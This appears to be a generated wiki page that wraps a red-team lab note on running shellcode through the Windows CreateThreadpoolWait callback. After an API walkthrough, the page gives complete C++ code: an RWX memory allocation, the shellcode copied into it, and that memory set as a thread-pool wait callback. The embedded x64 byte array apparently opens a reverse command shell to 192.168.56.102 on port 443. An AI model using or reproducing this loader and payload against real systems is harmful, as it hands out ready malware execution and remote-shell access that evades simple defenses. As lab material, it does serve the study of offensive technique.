---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Shellcode Execution via CreateThreadpoolWait

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-shellcode-execution-via-createthreadpoolwait` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Shellcode Execution via CreateThreadpoolWait](../../topics/offensive-security/shellcode-execution-via-createthreadpoolwait.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-shellcode-execution-via-createthreadpoolwait |
| name | Shellcode Execution via CreateThreadpoolWait |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait.md |

## Preserved Source Material

````yaml
_asset_filenames:
- SetThreadpoolWait-shellcode.gif
_body: "# Shellcode Execution via CreateThreadpoolWait\n\nThis is a quick lab to explore the sequence of APIs, that can execute\
  \ shellcode by invoking a callback function passed to `CreateThreadpoolWait`.\n\n## Technique Overview\n\n1. `CreateEvent`\
  \ is used to create an event object with a `Signaled` state\n2. RWX memory for the shellcode is allocated with `VirtualAlloc`\
  \ and the shellcode is written there\n3. `CreateThreadpoolWait` is used to create a wait object. 1st argument of the function\
  \ is a callback function, that will be called once the wait ends (immediately in our case, since our waitable event is in\
  \ the `Signaled` state from the start). We will pass the address of our shellcode (allocated in step 2) as the callback\
  \ function\n4. `SetThreadpoolWait` is used to set wait object to the wait object created in step 3\n5. `WaitForSingleObject`\
  \ is used to wait for the waitable object to become `Signaled`, but since our event (waitable) object was created with a\
  \ `Signaled` state in step 1, our callback function specified in step 3 is called and the shellcode is executed right away:\n\
  \n![](../../.gitbook/assets/SetThreadpoolWait-shellcode.gif)\n\n## Code\n\n```cpp\n#include <windows.h>\n#include <threadpoolapiset.h>\n\
  \nunsigned char shellcode[] = \n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\"\n\"\\x51\\\
  x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\"\n\"\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\\
  xb7\\x4a\\x4a\\x4d\\x31\\xc9\"\n\"\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\\
  xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\"\n\"\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\\
  x85\\xc0\\x74\\x67\\x48\\x01\"\n\"\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\"\n\"\\xff\\\
  xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\"\n\"\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\\
  xe0\\x75\\xf1\\x4c\\x03\\x4c\"\n\"\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\"\n\"\\x66\\\
  x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\"\n\"\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\\
  x59\\x5a\\x41\\x58\\x41\\x59\"\n\"\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\"\n\"\\x8b\\\
  x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\"\n\"\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\\
  x81\\xec\\xa0\\x01\\x00\\x00\"\n\"\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\xbb\\xc0\\xa8\\x38\\x66\\x41\\x54\"\n\"\\x49\\\
  x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\"\n\"\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\\
  xba\\x29\\x80\\x6b\\x00\\xff\"\n\"\\xd5\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\"\n\"\\x48\\\
  xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\"\n\"\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\\
  x48\\x89\\xf9\\x41\\xba\\x99\"\n\"\\xa5\\x74\\x61\\xff\\xd5\\x48\\x81\\xc4\\x40\\x02\\x00\\x00\\x49\\xb8\\x63\"\n\"\\x6d\\\
  x64\\x00\\x00\\x00\\x00\\x00\\x41\\x50\\x41\\x50\\x48\\x89\\xe2\\x57\"\n\"\\x57\\x57\\x4d\\x31\\xc0\\x6a\\x0d\\x59\\x41\\\
  x50\\xe2\\xfc\\x66\\xc7\\x44\"\n\"\\x24\\x54\\x01\\x01\\x48\\x8d\\x44\\x24\\x18\\xc6\\x00\\x68\\x48\\x89\\xe6\"\n\"\\x56\\\
  x50\\x41\\x50\\x41\\x50\\x41\\x50\\x49\\xff\\xc0\\x41\\x50\\x49\\xff\"\n\"\\xc8\\x4d\\x89\\xc1\\x4c\\x89\\xc1\\x41\\xba\\\
  x79\\xcc\\x3f\\x86\\xff\\xd5\"\n\"\\x48\\x31\\xd2\\x48\\xff\\xca\\x8b\\x0e\\x41\\xba\\x08\\x87\\x1d\\x60\\xff\"\n\"\\xd5\\\
  xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\"\n\"\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\\
  xe0\\x75\\x05\\xbb\\x47\\x13\"\n\"\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\";\n\n\nint main()\n{\n\tHANDLE event\
  \ = CreateEvent(NULL, FALSE, TRUE, NULL);\n\tLPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT,\
  \ PAGE_EXECUTE_READWRITE);\n\tRtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));\n\n\tPTP_WAIT threadPoolWait\
  \ = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);\n\tSetThreadpoolWait(threadPoolWait, event, NULL);\n\
  \tWaitForSingleObject(event, INFINITE);\n\t\n\treturn 0;\n}\n```\n\n## References\n\n[https://gist.github.com/alfarom256/180c90c2bc0ae6bfa5d109d822ea77a4](https://gist.github.com/alfarom256/180c90c2bc0ae6bfa5d109d822ea77a4)"
_relative_path: offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait.md
````
